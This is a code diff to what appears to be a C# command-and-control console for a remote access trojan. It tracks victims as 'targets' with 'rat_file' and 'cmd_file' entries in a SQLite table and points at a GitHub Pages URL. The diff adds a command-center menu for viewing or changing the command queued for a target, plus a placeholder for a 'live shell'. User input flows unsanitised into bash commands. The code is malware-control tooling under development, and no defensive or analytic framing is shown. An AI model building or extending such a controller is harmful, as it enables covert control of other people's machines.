@@ -8,6 +8,7 @@ using Microsoft.Data.Sqlite;
 string mover_file = "mover.bat";
 string shell = "/bin/bash";
 string github_repo_link = "https://samjoel2007.github.io/Strings/";  
+int command_center_flag = 0;
 
 void shell_exec(string command) {
 	System.Diagnostics.Process.Start("/bin/bash", $"-c \"{command}\"");
@@ -15,6 +16,33 @@ void shell_exec(string command) {
 
 void command_center() {
 	
+	void view_command(string target) {
+		string command = $"cat {target}/{target}.txt";
+		shell_exec(command);
+		Thread.Sleep(3000);
+		Console.Write("\n");
+	}
+	
+	void change_command() {
+		Console.Write("Enter new command: ");
+		string new_command = Console.ReadLine();
+	}
+	Console.Write("Enter target's name: ");
+	string target_name = Console.ReadLine();
+	
+	// OPTIONS
+	Console.WriteLine("\n(1) VIEW TARGET COMMAND");
+	Console.WriteLine("\n(2) CHANGE COMMAND");
+	Console.WriteLine("\n(3) LIVE SHELL");
+	Console.WriteLine("\n(0) GO BACK");
+	Console.Write("SELECT AN OPTION: ");
+	string opn = Console.ReadLine();
+	
+	if (opn == "0") {
+		command_center_flag = 1;
+	} else if (opn == "1") {
+		view_command(target_name);
+	}
 }
 
 void save_target(string target_name, string rat_file, string cmd_file) {
@@ -53,7 +81,7 @@ void view_targets() {
         while(reader.Read())
         {
 	    Console.WriteLine(reader["id"] + "    " + reader["target_name"] + "       " + reader["rat_file"] + "       " + reader["cmd_file"]); 
-            Console.WriteLine("-------------------");
+            Console.WriteLine("-----------------------------------------------------------------------------------------------");
         }
 
         reader.Close();
@@ -139,7 +167,9 @@ while (true) {
     	view_targets();
 
     } else if (opn == "3") {
-	command_center();
+	while (command_center_flag != 1) {
+		command_center();
+	}
     } else {
          return;
     } 
